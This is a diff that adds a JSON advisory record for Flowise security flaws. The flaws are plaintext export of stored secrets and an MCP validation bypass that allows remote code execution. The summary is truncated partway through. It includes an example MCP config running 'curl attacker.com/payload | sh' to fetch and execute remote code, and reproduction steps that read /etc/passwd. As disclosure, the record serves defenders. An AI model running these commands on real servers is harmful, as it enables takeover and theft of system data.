@@ -1,0 +1,51 @@
+{
+  "id": "GHSA-vrr6-xgc3-j99r",
+  "aliases": [],
+  "title": "Multiple AI Infrastructure Security Vulnerabilities - Credential Exposure, MCP Bypass, Sandbox Escape",
+  "summary": "## Summary\r\n\r\n**Multiple AI Infrastructure Security Vulnerabilities in Flowise**\r\n\r\nFour vulnerabilities in Flowise's AI/LLM infrastructure allow credential theft via export, remote code execution via MCP bypass, LLM manipulation via tool confusion, and sandbox escape via overly-permissive dependencies.\r\n\r\nThese are AI-specific vulnerability classes that traditional security scanners do not detect.\r\n\r\n---\r\n\r\n## Finding 1: Plaintext Secret Exposure in Data Export (CWE-312)\r\n\r\n### Severity: High - CVSS 3.1: 7.5\r\n\r\n### Description\r\n\r\nThe `exportData()` function exports `Variable` entities with their `value` field in plaintext. Variables in Flowise store API keys, database connection strings, and other secrets. Unlike `Credential` entities (which use `encryptedData` and are stripped on export), Variables have zero encryption and no sanitization on the export path.\r\n\r\n### Affected Code\r\n\r\n`packages/server/src/services/export-import/index.ts`, lines 156-158:\r\n\r\n```typescript\r\nlet Variable: Variable[] | { data: Variable[]; total: number } =\r\n    exportInput.variable === true\r\n        ? await variableService.getAllVariables(activeWorkspaceId)\r\n        : []\r\n```\r\n\r\nThe `Variable` entity (`packages/server/src/database/entities/Variable.ts`) stores `value` as plaintext:\r\n```typescript\r\n@Column({ nullable: true, type: 'text' })\r\nvalue: string\r\n```\r\n\r\nCompare with `Credential` which stores `encryptedData` and explicitly strips it on list operations.\r\n\r\n### Steps to Reproduce\r\n\r\n1. Create a Variable in Flowise (e.g., name: `OPENAI_API_KEY`, value: `sk-proj-abc123...`)\r\n2. Export workspace data via the export feature or API\r\n3. The exported JSON contains the full variable value in plaintext:\r\n```json\r\n{\r\n    \"name\": \"OPENAI_API_KEY\",\r\n    \"value\": \"sk-proj-abc123...\",\r\n    \"type\": \"secret\"\r\n}\r\n```\r\n\r\n### Impact\r\n\r\nAny user with `workspace:export` permission, or anyone who obtains an export file, gets every API key, token, and credential stored as a Flowise Variable. This includes OpenAI/Anthropic keys, database URLs, and service tokens.\r\n\r\n### Remediation\r\n\r\nEncrypt Variable values at rest (like Credentials), and strip or mask values in exports:\r\n```typescript\r\n// Strip variable values on export\r\nconst sanitizedVariables = variables.map(v => ({ ...v, value: '***REDACTED***' }))\r\n```\r\n\r\n---\r\n\r\n## Finding 2: MCP Security Bypass via Environment Variable - Full RCE (CWE-78)\r\n\r\n### Severity: Critical - CVSS 3.1: 9.8\r\n\r\n### Description\r\n\r\nSetting `CUSTOM_MCP_SECURITY_CHECK=false` completely disables all MCP command validation - the command allowlist, injection checks, dangerous flag checks, and file access checks are all skipped. This turns Flowise into an arbitrary command execution platform.\r\n\r\n### Affected Code\r\n\r\n`packages/components/nodes/tools/MCP/CustomMCP/CustomMCP.ts`, line 176:\r\n\r\n```typescript\r\nif (process.env.CUSTOM_MCP_SECURITY_CHECK !== 'false') {\r\n    try {\r\n        validateMCPServerConfig(serverParams)\r\n    } catch (error) {\r\n        throw new Error(`Security validation failed: ${error.message}`)\r\n    }\r\n}\r\n```\r\n\r\nSame bypass in `SupergatewayMCP.ts`, line 109.\r\n\r\nWhen disabled, a Custom MCP node can execute arbitrary commands:\r\n```json\r\n{\r\n    \"command\": \"bash\",\r\n    \"args\": [\"-c\", \"curl attacker.com/payload | sh\"]\r\n}\r\n```\r\n\r\nThe flag is documented in `packages/server/src/commands/base.ts` (line 105) as a server startup option.\r\n\r\n### Steps to Reproduce\r\n\r\n1. Start Flowise with `CUSTOM_MCP_SECURITY_CHECK=false`\r\n2. Create a Custom MCP node with command: `bash`, args: `[\"-c\", \"id && cat /etc/passwd\"]`\r\n3. Execute the flow - arbitrary commands run on the server\r\n\r\n### Impact\r\n\r\nFull remote code execution on the Flowise server. This flag is likely set by administrators who find the allowlist too restrictive for their use case, turning a \"convenience\" flag into a complete security bypass.\r\n\r\n### Remediation\r\n\r\nRemove the bypass flag entirely. If flexibility is needed, expand the allowlist rather than providing a global disable:\r\n```...",
+  "published_at": "2026-08-31T14:02:02.000Z",
+  "modified_at": "2026-08-31T14:02:02.000Z",
+  "severity": {
+    "level": "high",
+    "score": 7.6,
+    "vector": "CVSS:4.0/AV:N/AC:L/AT:P/PR:L/UI:N/VC:H/VI:H/VA:L/SC:N/SI:N/SA:N",
+    "source": "ghsa"
+  },
+  "kev": {
+    "listed": false,
+    "added_at": null,
+    "checked": true
+  },
+  "epss": null,
+  "cwes": [
+    "CWE-78",
+    "CWE-312"
+  ],
+  "affected": [
+    {
+      "product": "flowise",
+      "ranges": [
+        {
+          "introduced": "0",
+          "fixed": "3.1.4"
+        }
+      ]
+    }
+  ],
+  "references": [
+    {
+      "url": "https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-vrr6-xgc3-j99r",
+      "type": "advisory"
+    }
+  ],
+  "sources": [
+    {
+      "type": "ghsa",
+      "id": "GHSA-vrr6-xgc3-j99r",
+      "url": "https://github.com/FlowiseAI/Flowise/security/advisories/GHSA-vrr6-xgc3-j99r",
+      "license": "CC-BY-4.0"
+    }
+  ],
+  "revision": "sha256:c5fc49f6b342d6723198a0ed6f2640bc6b81ead3674b0ea70ec50009c011f85c",
+  "note": null
+}
